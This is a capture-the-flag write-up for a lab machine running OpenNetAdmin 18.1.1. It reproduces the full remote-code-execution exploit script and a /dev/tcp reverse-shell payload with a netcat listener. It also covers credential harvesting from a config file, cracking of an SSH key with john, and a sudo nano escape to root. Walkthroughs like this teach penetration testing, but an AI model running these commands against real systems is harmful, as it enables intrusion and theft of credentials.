OpenNetAdmin v18.1.1 RCE# Date: 2019-11-19# Exploit Author: mattpascoe# Vendor Homepage: http://opennetadmin.com/# Software Link: https://github.com/opennetadmin/ona# Version: v18.1.1# Tested on: Linux#!/bin/bashURL=\"${1}\"while true;do echo -n \"$ \"; read cmd curl --silent -d \"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";${cmd};echo \\\"END\\\"&amp;xajaxargs[]=ping\" \"${URL}\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1doneLet’s download the raw exploit.$ wget https://www.exploit-db.com/raw/47691Then we make it executable.$ chmod +x 47691.shAt last we start the shell script and point it to the target url.And a shell is popping up.$ ./47691.sh http://10.10.10.171/ona/$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)Please make sure you don’t forgett the / behind ona because that would breakyour reverse shell.Now this is a pretty restricted shell because we only can enter url encoded inputto get code execution.In my case i used the Burp Suite included decoder to encode my payload for afull working reverse shell. Payload:bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;local_ip&gt;/&lt;local_port&gt; 0&gt;&amp;1' Encoded payload:%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27Now we have to start a netcat listener on our desired port, then enter the url encoded string to our shell to get the reverse shell.$ nc -lnvp 9001listening on [any] 9001 ...connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470bash: cannot set terminal process group (995): Inappropriate ioctl for devicebash: no job control in this shellwww-data@openadmin:/opt/ona/www$To upgrade our shell to a bit more comfy one, we use python to import /bin/bashand then we modify our shell output and exporting xterm.www-data@openadmin:/opt/ona/www$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'This was the first part. For the next part we have to exactly enter the followinginputs, otherwise we will break your shell.Ctrl + zstty raw -echofgEnterEnterexport XTERM=xtermIf you ente everything correctly, you will get a full working shell on the box.www-data@openadmin:/opt/ona/www$ ^Z[1]+ Stopped nc -lnvp 9001$ stty raw -echo$ nc -lnvp 9001www-data@openadmin:/opt/ona/www$www-data@openadmin:/opt/ona/www$ export XTERM=xtermwww-data@openadmin:/opt/ona/www$ ls.htaccess.example images/ login.php winc/config/ include/ logout.php workspace_plugins/config_dnld.php index.php modules/dcm.php local/ plugins/www-data@openadmin:/opt/ona/www$ lsPlease notice that this only works with bash. If you are using zsh you may ran into some issues.EnumerationAt first we start with some basic manually enumeration on the /var/www/ directory to see whatwe get.www-data@openadmin:/var/www$ ls -lals -latotal 16drwxr-xr-x 4 root root 4096 Nov 22 2019 .drwxr-xr-x 14 root root 4096 Nov 21 2019 ..drwxr-xr-x 6 www-data www-data 4096 Nov 22 2019 htmldrwxrwx--- 2 jimmy internal 4096 Nov 23 2019 internallrwxrwxrwx 1 www-data www-data 12 Nov 21 2019 ona -&gt; /opt/ona/wwwWe notice that we have only access to html and to the directory we are landed after the footholding.Furhter we have to privilege escalate to jimmy, to get access to the internal directory.Let’s check who else have an account on this box.www-data@openadmin:/var/www$ cat /etc/passwdcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinjimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bashmysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/falsejoanna:x:1001:1001:,,,:/home/joanna:/bin/bashSo we have another user. Let’s take that to our nodes.User: jimmyUser: joannaPrivilege Escalation to jimmyNow we check out what we find inside the ona directory we can access and have acloser look to the database_settings.inc.php file.www-data@openadmin:/var/www/html/ona/local/config$ lsdatabase_settings.inc.php motd.txt.example run_installerwww-data@openadmin:/var/www/html/ona/local/config$ cat database_settings.inc.php&lt;?php$ona_contexts=array ( 'DEFAULT' =&gt; array ( 'databases' =&gt; array ( 0 =&gt; array ( 'db_type' =&gt; 'mysqli', 'db_host' =&gt; 'localhost', 'db_login' =&gt; 'ona_sys', 'db_passwd' =&gt; 'n1nj4W4rri0R!', 'db_database' =&gt; 'ona_default', 'db_debug' =&gt; false, ), ), 'description' =&gt; 'Default data context', 'context_color' =&gt; '#D3DBFF', ),);?&gt;And we are lucky to get credentials for the mysql database.User: ona_sysPassword: n1nj4W4rri0R!Let’s see if the password got reused by any of the known accounts.www-data@openadmin:/var/www/html/ona/local/config$ su - jimmyPassword:jimmy@openadmin:~$Privilege Escalation to joannaBingo! Now that we are successfully escalated to jimmy, let’s check out theinternal directory.In the main.php file we get a hint that the file runs on an webserver andis able to cat out the ssh private key of joanna.jimmy@openadmin:/var/www/internal$ cat main.php &lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; # Open Admin Trusted# OpenAdmin$output = shell_exec('cat /home/joanna/.ssh/id_rsa');echo \"&lt;pre&gt;$output&lt;/pre&gt;\";?&gt;&lt;html&gt;&lt;h3&gt;Don't forget your \"ninja\" password&lt;/h3&gt;Click here to logout &lt;a href=\"logout.php\" tite = \"Logout\"&gt;Session&lt;/html&gt;In our nmap we couldn’t find any other port or webserver so let’s see if there is somethinglistening on 127.0.0.1 aka the localhost.jimmy@openadmin:~$ ss -tulpnNetid State Recv-Q Send-Q Local Address:Port Peer Address:Portudp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*tcp LISTEN 0 128 127.0.0.1:52846 0.0.0.0:*tcp LISTEN 0 128 127.0.0.53%lo:53 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*tcp LISTEN 0 128 *:80 *:*tcp LISTEN 0 128 [::]:22 [::]:*The interesting port here is the high port TCP/52846 which we immediately throw a curl atto see if we can get the private key.jimmy@openadmin:/var/www$ curl 127.0.0.1:52846/main.php&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6DkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YOShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Duy8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h//U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFgS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4FFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzhTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexaRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7ZuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMtqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adtz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQeK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN-----END RSA PRIVATE KEY-----&lt;/pre&gt;&lt;html&gt;&lt;h3&gt;Don't forget your \"ninja\" password&lt;/h3&gt;Click here to logout &lt;a href=\"logout.php\" tite = \"Logout\"&gt;Session&lt;/html&gt;Perfect! Now we save the key in a file on our local system and use john to convert itinto a readable format which we can crack.$ sudo /usr/share/john/ssh2john.py joanna_id_rsa &gt; joanna_id_rsa_hashWith this done, it’s time to crack the key.$ sudo john joanna_id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statusbloodninjas (joanna_id_rsa)1g 0:00:00:07 DONE (2020-11-10 19:25) 0.1347g/s 1932Kp/s 1932Kc/s 1932KC/sa6_123..*7¡Vamos!Session completedAwesome! We get the password.Password: bloodninjasChange the file permission on the key - like always.$ chmod 600 joanna_id_rsaAnd login as joanna to grab the user flag.$ ssh -i joanna_id_rsa joanna@10.10.10.171load pubkey \"joanna_id_rsa\": invalid formatEnter passphrase for key 'joanna_id_rsa':Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Nov 10 18:34:55 UTC 2020 System load: 0.32 Processes: 125 Usage of /: 49.6% of 7.81GB Users logged in: 0 Memory usage: 19% IP address for ens160: 10.10.10.171 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch41 packages can be updated.12 updates are security updates.Last login: Thu Jan 2 21:12:40 2020 from 10.10.14.3user.txtjoanna@openadmin:~$ cat user.txtc9b2cf07d40807e62af62660f0c81b5fThe way to rootWe start with having a look at the group memberships.joanna@openadmin:~$ iduid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)So joanna doens’t seems to have any special memberships so far. Let’s try if joanna has an entry in the sudors file.joanna@openadmin:~$ sudo -lMatching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/privWell that’s the case. The user joanna is able to execute the nano binary with root privileges in /opt/priv which meansthat we can create a file in there.Let’s have a look at GTFObins if we can find some useful information to execute a root shell. https://gtfobins.github.io/gtfobins/nano/Now we try to get this running.joanna@openadmin:~$ sudo /bin/nano /opt/privWe press Ctrl+r and then Ctrl+x.Command to execute:^G Get Help\t\t\t\t\t\t^X Read File^C Cancel\t\t\t\t\t\tM-F New BufferThen we enter reset; sh 1&gt;&amp;0 2&gt;&amp;0 and press enter to execute it.As we can see we spawned a shell out of nano.Command to execute: reset; sh 1&gt;&amp;0 2&gt;&amp;0## iduid=0(root) gid=0(root) groups=0(root)root.txtAll what we have to do is to grab the root flag and that’s it!# cat /root/root.txt2f907ed450b361b2c2bf4e8795d5b561THE ENDResources Topic URL OpenNetAdmin 18.1.1 - Remote Code Execution click here GTFOBins - nano click here " } ]
